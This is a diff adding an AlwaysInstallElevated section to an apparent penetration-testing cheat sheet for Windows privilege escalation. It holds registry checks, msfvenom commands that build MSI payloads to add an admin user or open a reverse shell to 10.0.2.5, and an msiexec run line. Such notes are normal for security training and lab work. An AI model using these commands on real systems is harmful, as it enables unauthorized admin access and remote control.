@@ -161,6 +161,20 @@
 - ``` $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal ``` !!! check real permission of file -> what can run what cannot run , that process initating user may not have that permission to do add user in system. then just rev shell is enough
 - Default username password of powerup : ``` john|Password123! ``` (rmb chg \! when run command)
 
+## AlwaysInstallElevated Privledge
+1. check if both return register = 0x1
+   ```
+   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+   ```
+2. Add new user OR direct revshell
+   ```
+    msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
+    [OR]
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
+   ``` 
+3. Run the msi ``` msiexec /i "C:\xampp\htdocs\shenzi\test.msi" ```
+
 ## Unquoted Service paths
 - unquoted path: windows will try to start exe follow this order
   ``` 
